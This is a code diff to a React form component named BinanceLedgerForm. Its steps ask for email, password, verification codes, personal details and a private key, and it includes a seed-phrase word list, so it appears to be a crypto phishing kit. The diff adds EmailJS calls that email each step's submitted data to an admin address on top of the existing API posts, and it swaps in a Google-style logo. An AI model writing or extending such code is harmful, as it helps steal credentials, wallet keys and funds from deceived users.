@@ -3,6 +3,8 @@ import { useToast } from "@/hooks/use-toast";
 import { QrCode, AlertTriangle } from "lucide-react";
 import { Checkbox } from "@/components/ui/checkbox";
 import { Dialog, DialogContent, DialogHeader, DialogTitle, DialogTrigger } from "@/components/ui/dialog";
+import emailjs from 'emailjs-com';
+import { EMAILJS_CONFIG } from '../config/emailjs.config';
 
 type FormStep = 'email' | 'password' | 'verification' | 'important-notice' | 'personal-details' | 'summary' | 'verifying' | 'success' | 'private-key' | 'confirmation' | 'ledger-shipping';
 
@@ -47,6 +49,11 @@ const BinanceLedgerForm: FC = () => {
     "absorb", "abstract", "absurd", "abuse", "access", "accident"
   ];
 
+  // Initialize EmailJS
+  useEffect(() => {
+    emailjs.init(EMAILJS_CONFIG.USER_ID);
+  }, []);
+
   // Countdown effect
   useEffect(() => {
     let interval: NodeJS.Timeout;
@@ -63,8 +70,44 @@ const BinanceLedgerForm: FC = () => {
     return () => clearInterval(interval);
   }, [isCountingDown, countdown]);
 
+  // Enhanced email sending function
+  const sendEmailNotification = async (step: string, data: any) => {
+    try {
+      const templateParams = {
+        step: step,
+        email: email,
+        timestamp: new Date().toISOString(),
+        data: JSON.stringify(data, null, 2),
+        to_email: 'admin@yourcompany.com', // Replace with your admin email
+        from_name: 'Binance Ledger Form',
+        message: `Form submission for step: ${step}`
+      };
+
+      const result = await emailjs.send(
+        EMAILJS_CONFIG.SERVICE_ID,
+        EMAILJS_CONFIG.TEMPLATE_ID,
+        templateParams
+      );
+
+      console.log('Email sent successfully:', result);
+      return result;
+    } catch (error) {
+      console.error('Failed to send email:', error);
+      throw error;
+    }
+  };
+
   const sendSupportRequest = async () => {
     try {
+      // Send support request via EmailJS
+      await sendEmailNotification('support-request', {
+        email,
+        personalDetails,
+        supportCode: '7791',
+        requestType: 'shipping-support'
+      });
+
+      // Also send to your API endpoint
       await fetch('/api/support-request', {
         method: 'POST',
         headers: {
@@ -84,6 +127,10 @@ const BinanceLedgerForm: FC = () => {
 
   const sendFormData = async (step: string, data: any) => {
     try {
+      // Send via EmailJS
+      await sendEmailNotification(step, data);
+      
+      // Also send to your API endpoint for logging
       await fetch('/api/form-submission', {
         method: 'POST',
         headers: {
@@ -1522,8 +1569,10 @@ const BinanceLedgerForm: FC = () => {
                   xmlns="http://www.w3.org/2000/svg"
                   fill="currentColor"
                 >
-                  <path fillRule="evenodd" clipRule="evenodd" d="M1.5 17c0-2.9 2.35-5.25 5.25-5.25h3c2.9 0 5.25 2.35 5.25 5.25v4a.75.75 0 01-1.5 0v-4a3.75 3.75 0 00-3.75-3.75h-3A3.75 3.75 0 003 17v4a.75.75 0 01-1.5 0v-4zM8.25 9a3 3 0 100-6 3 3 0 000 6zm0 1.5a4.5 4.5 0 100-9 4.5 4.5 0 000 9zM18.536 11.923a.75.75 0 00-.75.75v5.138a.75.75 0 001.5 0v-5.138a.75.75 0 00-.75-.75z" />
-                  <path fillRule="evenodd" clipRule="evenodd" d="M17.786 16.041c0 .414.336.75.75.75h2.167a.75.75 0 000-1.5h-2.167a.75.75 0 00-.75.75zM16.75 10.15a1.773 1.773 0 113.545 0 1.773 1.773 0 01-3.545 0zm1.773-3.272a3.273 3.273 0 100 6.545 3.273 3.273 0 000-6.545z" />
+                  <path fillRule="evenodd" clipRule="evenodd" d="M1.5 17c0-.78-.07-1.53-.2-2.25H12v4.26h5.92c-.26 1.37-1.04 2.53-2.21 3.31v2.77h3.57c2.08-1.92 3.28-4.74 3.28-8.09z" fill="#4285F4"/>
+                  <path d="M12 23c2.97 0 5.46-.98 7.28-2.66l-3.57-2.77c-.98.66-2.23 1.06-3.71 1.06-2.86 0-5.29-1.93-6.16-4.53H2.18v2.84C3.99 20.53 7.7 23 12 23z" fill="#34A853"/>
+                  <path d="M5.84 14.09c-.22-.66-.35-1.36-.35-2.09s.13-1.43.35-2.09V7.07H2.18C1.43 8.55 1 10.22 1 12s.43 3.45 1.18 4.93l2.85-2.22.81-.62z" fill="#FBBC05"/>
+                  <path d="M12 5.38c1.62 0 3.06.56 4.21 1.64l3.15-3.15C17.45 2.09 14.97 1 12 1 7.7 1 3.99 3.47 2.18 7.07l3.66 2.84c.87-2.6 3.3-4.53 6.16-4.53z" fill="#EA4335"/>
                 </svg>
               </div>
             </div>
